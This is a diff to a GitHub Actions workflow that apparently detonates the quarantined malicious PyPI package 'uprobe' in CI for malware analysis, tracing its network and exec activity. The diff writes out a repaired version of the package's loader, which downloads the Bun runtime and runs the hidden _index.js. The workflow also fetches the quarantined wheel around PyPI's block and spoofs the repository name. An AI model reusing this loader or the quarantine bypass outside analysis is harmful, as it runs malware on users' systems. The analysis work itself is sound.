@@ -18,8 +18,6 @@ jobs:
         run: |
           mkdir -p /tmp/packages
           cd /tmp/packages
-          # pip install is blocked because the project is quarantined on PyPI,
-          # but the wheel object on files.pythonhosted.org is still served.
           curl -fL -o uprobe-0.1.4-py3-none-any.whl \
             https://files.pythonhosted.org/packages/df/31/a03ea8534bdad483ba856f85ff57aaccc642d432388c55b046d45a788c59/uprobe-0.1.4-py3-none-any.whl
           ls -la
@@ -68,62 +66,55 @@ jobs:
           python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))" \
             | xargs -I{} ls -la {}
 
-      - name: Execute payload directly (fixed Python syntax)
-        # The .pth one-liner has two bugs preventing execution:
-        # 1. `if` as a compound statement after `;` — always a SyntaxError in Python
-        # 2. `_T` (tempfile) and `_G` undefined in the first line variant
-        # Reconstruct the logic as a proper multi-line script and run it directly.
+      - name: Write fixed payload script
+        run: |
+          UPROBE_DIR=$(python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))")
+          echo "uprobe dir: $UPROBE_DIR"
+          cat > /tmp/run_payload.py << PYEOF
+          import os, subprocess, urllib.request, platform, sys, tempfile, glob, zipfile
+
+          uprobe_dir = "$UPROBE_DIR"
+          _j = os.path.join(uprobe_dir, "_index.js")
+          if not os.path.exists(_j):
+              _c = glob.glob(os.path.join(uprobe_dir, "*", "_index.js"))
+              _j = _c[0] if _c else ""
+
+          print(f"_index.js: {_j} (exists={os.path.exists(_j)}, size={os.path.getsize(_j) if os.path.exists(_j) else 0})")
+
+          _e = os.name == "nt"
+          _b = os.path.join(tempfile.gettempdir(), "b", "bun" + (".exe" if _e else ""))
+          os.makedirs(os.path.dirname(_b), exist_ok=True)
+
+          if not os.path.exists(_b):
+              _a = "aarch64" if platform.machine() == "arm64" else "x64"
+              _m = {"linux": "linux", "darwin": "darwin", "win32": "windows"}.get(sys.platform, "linux")
+              _z = os.path.join(tempfile.gettempdir(), "b.zip")
+              url = f"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-{_m}-{_a}.zip"
+              print(f"Downloading Bun from: {url}")
+              urllib.request.urlretrieve(url, _z)
+              zipfile.ZipFile(_z).extract(os.path.basename(_b), os.path.dirname(_b))
+              os.chmod(_b, 0o755)
+              os.unlink(_z)
+              print(f"Bun installed at: {_b}")
+
+          print(f"Running: {_b} run {_j}")
+          result = subprocess.run([_b, "run", _j], check=False)
+          print(f"bun exit code: {result.returncode}")
+          PYEOF
+          echo "=== payload script ==="
+          cat /tmp/run_payload.py
+
+      - name: Execute payload (spoofed repo)
         continue-on-error: true
         env:
           GITHUB_REPOSITORY: xyz/xyz
         run: |
-          UPROBE_DIR=$(python -c "import uprobe, os; print(os.path.dirname(uprobe.__file__))")
-          echo "uprobe dir: $UPROBE_DIR"
-
-          # Write the fixed payload script (bash substitutes $UPROBE_DIR into the heredoc)
-          cat > /tmp/run_payload.py << PYEOF
-import os, subprocess, urllib.request, platform, sys, tempfile, glob, zipfile
-
-uprobe_dir = "$UPROBE_DIR"
-_j = os.path.join(uprobe_dir, "_index.js")
-if not os.path.exists(_j):
-    _c = glob.glob(os.path.join(uprobe_dir, "*", "_index.js"))
-    _j = _c[0] if _c else ""
-
-print(f"_index.js: {_j} (exists={os.path.exists(_j)}, size={os.path.getsize(_j) if os.path.exists(_j) else 0})")
-
-_e = os.name == "nt"
-_b = os.path.join(tempfile.gettempdir(), "b", "bun" + (".exe" if _e else ""))
-os.makedirs(os.path.dirname(_b), exist_ok=True)
-
-if not os.path.exists(_b):
-    _a = "aarch64" if platform.machine() == "arm64" else "x64"
-    _m = {"linux": "linux", "darwin": "darwin", "win32": "windows"}.get(sys.platform, "linux")
-    _z = os.path.join(tempfile.gettempdir(), "b.zip")
-    url = f"https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-{_m}-{_a}.zip"
-    print(f"Downloading Bun from: {url}")
-    urllib.request.urlretrieve(url, _z)
-    zipfile.ZipFile(_z).extract(os.path.basename(_b), os.path.dirname(_b))
-    os.chmod(_b, 0o755)
-    os.unlink(_z)
-    print(f"Bun installed at: {_b}")
-
-print(f"Running: {_b} run {_j}")
-result = subprocess.run([_b, "run", _j], check=False)
-print(f"bun exit code: {result.returncode}")
-PYEOF
-
-          echo "=== payload script ==="
-          cat /tmp/run_payload.py
-          echo ""
-          echo "=== executing ==="
           strace -f -e trace=network,execve,openat -o /tmp/uprobe-strace.log \
             python /tmp/run_payload.py 2>&1 || true
 
       - name: Wait for _index.js execution to complete
         run: |
           echo "Waiting 120 seconds for _index.js network activity..."
-          echo "Harden Runner will capture all outbound connections."
           sleep 120
 
       - name: Check for malware artifacts
@@ -142,7 +133,7 @@ PYEOF
           ps aux | grep -E "curl|wget|bash|nohup|python|bun|node" | grep -v grep || echo "None"
           echo ""
           echo "=== strace network/exec summary ==="
-          grep -E "connect|execve|github|bun" /tmp/uprobe-strace.log | head -50 || true
+          grep -E "connect|execve" /tmp/uprobe-strace.log | head -50 || true
 
       - name: Upload strace log
         uses: actions/upload-artifact@v4
